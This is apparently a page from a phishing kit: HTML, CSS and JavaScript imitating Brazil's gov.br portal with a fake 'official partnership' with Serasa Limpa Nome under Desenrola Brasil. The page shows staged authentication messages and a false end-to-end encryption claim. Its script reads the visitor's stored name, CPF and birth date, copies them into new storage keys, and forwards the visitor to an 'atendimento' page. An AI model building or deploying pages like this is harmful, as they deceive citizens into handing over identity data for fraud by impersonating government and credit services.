<style>
:root {
  --gov-blue: #1351B4;
  --gov-blue-dark: #0C326F;
  --gov-border: #E5E5E5;
  --gov-text: #333333;
  --gov-muted: #666666;
  --gov-bg: #FFFFFF;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
  font-size: 16px;
  line-height: 1.5;
  color: var(--gov-text);
  background: var(--gov-bg);
  min-height: 100svh;
  display: flex;
  flex-direction: column;
}
.gov-header-top {
  background: #fff;
  padding: 12px 24px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.gov-header-top .brand {
  display: flex;
  align-items: center;
  gap: 0;
}
.gov-header-top .brand img {
  width: 70px;
  height: 24px;
  object-fit: contain;
}
.gov-header-top .brand .divider {
  border-left: 1px solid #ccc;
  height: 24px;
  margin: 0 16px;
}
.gov-header-top .actions {
  display: flex;
  align-items: center;
  gap: 4px;
}
.gov-header-top .actions button {
  border: none;
  background: none;
  color: var(--gov-blue);
  cursor: pointer;
  padding: 8px;
  font-size: 16px;
}
.gov-header-top .user-pill i {
  display: inline-flex;
  align-items: center;
  line-height: 1;
}
.gov-header-top .user-pill {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  background: #1451B4;
  color: #fff;
  border: none;
  border-radius: 9999px;
  padding: 6px 16px;
  font-size: 14px;
  font-weight: 600;
  margin-left: 16px;
  cursor: default;
}
.gov-nav {
  background: #fff;
  padding: 16px 24px;
  display: flex;
  justify-content: space-between;
  align-items: center;
  border-bottom: 1px solid var(--gov-border);
}
.gov-nav .title-btn {
  display: flex;
  align-items: center;
  gap: 10px;
  border: none;
  background: none;
  cursor: default;
  padding: 0;
  color: var(--gov-muted);
  font-size: 1rem;
  font-weight: 300;
  font-family: inherit;
}
.gov-nav .title-btn i { color: var(--gov-blue); font-size: 16px; }
.gov-nav .search {
  border: none;
  background: none;
  color: var(--gov-blue);
  font-size: 16px;
  cursor: pointer;
  padding: 0;
}
.page-main {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 32px 24px 48px;
  background: #fff;
}
.wrap {
  width: 100%;
  max-width: 440px;
  text-align: center;
}
.badge {
  display: inline-block;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: .06em;
  text-transform: uppercase;
  color: var(--gov-blue);
  background: rgba(19, 81, 180, 0.08);
  padding: 6px 12px;
  border-radius: 4px;
  margin-bottom: 20px;
}
h1 {
  font-size: 1.35rem;
  font-weight: 600;
  color: var(--gov-blue-dark);
  line-height: 1.35;
  margin-bottom: 8px;
}
.sub {
  font-size: 14px;
  color: var(--gov-muted);
  line-height: 1.55;
  margin-bottom: 32px;
}
.sub strong { color: var(--gov-text); font-weight: 600; }
.logos {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 12px;
  margin-bottom: 28px;
}
.logo-box {
  flex: 0 0 auto;
  min-width: 110px;
  height: 52px;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #fff;
  border: 1px solid var(--gov-border);
  border-radius: 4px;
  padding: 8px 12px;
  box-shadow: 0 1px 3px rgba(0,0,0,.06);
}
.logo-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
.bridge {
  position: relative;
  width: 48px;
  height: 2px;
  flex-shrink: 0;
  background: #DBE8FB;
  border-radius: 2px;
}
.pulse {
  position: absolute;
  top: 50%;
  left: 0;
  width: 10px;
  height: 10px;
  margin: -5px 0 0 -5px;
  background: var(--gov-blue);
  border-radius: 50%;
  animation: travel 1.8s ease-in-out infinite;
}
@keyframes travel {
  0% { left: 0; opacity: .5; }
  50% { opacity: 1; }
  100% { left: 100%; opacity: .5; }
}
.status {
  font-size: 15px;
  font-weight: 600;
  color: var(--gov-blue);
  margin-bottom: 12px;
  min-height: 22px;
}
.dots {
  display: flex;
  justify-content: center;
  gap: 6px;
  margin-bottom: 24px;
}
.dots span {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #DBE8FB;
  animation: dot 1.2s ease-in-out infinite;
}
.dots span:nth-child(2) { animation-delay: .15s; background: var(--gov-blue); opacity: .7; }
.dots span:nth-child(3) { animation-delay: .3s; }
@keyframes dot {
  0%, 80%, 100% { transform: scale(.85); opacity: .5; }
  40% { transform: scale(1.1); opacity: 1; }
}
.bar {
  height: 4px;
  background: #EDEDED;
  border-radius: 4px;
  overflow: hidden;
  margin-bottom: 16px;
}
.bar > i {
  display: block;
  height: 100%;
  width: 0;
  background: linear-gradient(90deg, #2670E8, var(--gov-blue));
  border-radius: 4px;
  animation: load 3.2s ease-in-out forwards;
}
@keyframes load { 0% { width: 0; } 100% { width: 100%; } }
.foot {
  font-size: 12px;
  color: #888;
  line-height: 1.4;
}
@media (max-width: 480px) {
  .gov-header-top, .gov-nav { padding-left: 16px; padding-right: 16px; }
  .gov-header-top .brand .divider { margin: 0 8px; }
  .gov-header-top .user-pill span { max-width: 80px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
}

<body>
<header class="gov-header-top" role="banner">
  <div class="brand">
    <img src="/images/logo645.png" alt="gov.br" width="70" height="24">
    <div class="divider" aria-hidden="true"></div>
    <button type="button" aria-label="Menu de links"><i class="fas fa-ellipsis-v" aria-hidden="true"></i></button>
  </div>
  <div class="actions">
    <button type="button" aria-label="Cookies"><i class="fas fa-cookie-bite" aria-hidden="true"></i></button>
    <button type="button" aria-label="Sistemas"><i class="fas fa-th" aria-hidden="true"></i></button>
    <button type="button" class="user-pill" id="user-pill" aria-label="Usuário">
      <i class="fas fa-user" aria-hidden="true"></i>
      <span id="user-name">Entrar</span>
    </button>
  </div>
</header>
<nav class="gov-nav" aria-label="Navegação do serviço">
  <div class="title-btn">
    <i class="fas fa-bars" aria-hidden="true"></i>
    <span>Desenrola Brasil · Serasa</span>
  </div>
  <button type="button" class="search" aria-label="Pesquisar"><i class="fas fa-search" aria-hidden="true"></i></button>
</nav>
<main class="page-main">
  <div class="wrap">
    <div class="badge">Parceria oficial</div>
    <h1>Estabelecendo conexão segura</h1>
    <p class="sub">Canal <strong>gov.br</strong> em parceria com o <strong>Serasa Limpa Nome</strong> (programa Desenrola Brasil).</p>
    <div class="logos">
      <div class="logo-box"><img src="/images/logo645.png" alt="gov.br" width="90" height="32"></div>
      <div class="bridge" aria-hidden="true"><span class="pulse"></span></div>
      <div class="logo-box"><img src="/images/serasa-logo.avif" alt="Serasa" width="96" height="32" style="max-height:36px"></div>
    </div>
    <p class="status" id="status">Autenticando sessão no gov.br…</p>
    <div class="dots" aria-hidden="true"><span></span><span></span><span></span></div>
    <div class="bar"><i></i></div>
    <p class="foot">Criptografia de ponta a ponta · Não feche esta janela</p>
  </div>
</main>
<script>
(function () {
  try {
    var ud = JSON.parse(localStorage.getItem('userData') || '{}');
    var nome = String(ud.nome || '').trim();
    if (nome) {
      var first = nome.split(/\s+/)[0].toUpperCase();
      document.getElementById('user-name').textContent = first;
    }
  } catch (e) {}

  var steps = [
    { t: 0, msg: 'Autenticando sessão no gov.br…' },
    { t: 900, msg: 'Vinculando CPF ao Desenrola Brasil…' },
    { t: 1800, msg: 'Abrindo atendimento Serasa Limpa Nome…' }
  ];
  var el = document.getElementById('status');
  steps.forEach(function (s) {
    setTimeout(function () { el.textContent = s.msg; }, s.t);
  });

  function fmtCpf(d) { return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); }

  function syncSrFromUserData() {
    try {
      var ud = JSON.parse(localStorage.getItem('userData') || '{}');
      var cpf = String(ud.cpf || '').replace(/\D/g, '');
      if (cpf.length !== 11) return;
      var nome = String(ud.nome || '').trim();
      var nasc = ud.dataNascimento || ud.data_nascimento || '';
      var prev = {};
      try { prev = JSON.parse(localStorage.getItem('sr_consulta') || '{}'); } catch (e) { prev = {}; }
      if (typeof prev !== 'object' || !prev) prev = {};
      var merged = Object.assign({}, prev, {
        cpf: cpf,
        cpfformatado: prev.cpfformatado || fmtCpf(cpf),
        nome: nome || prev.nome || '',
        nascimento: nasc || prev.nascimento || '',
        ok: true
      });
      localStorage.setItem('sr_consulta', JSON.stringify(merged));
      localStorage.setItem('sr_cpf', cpf);
      if (nome) localStorage.setItem('sr_nome', nome.toUpperCase());
    } catch (e) {}
  }
  syncSrFromUserData();

  var dest = (window.__withParams ? window.__withParams('/atendimento/') : '/atendimento/');
  setTimeout(function () { window.location.href = dest; }, 3400);
})();
</script>
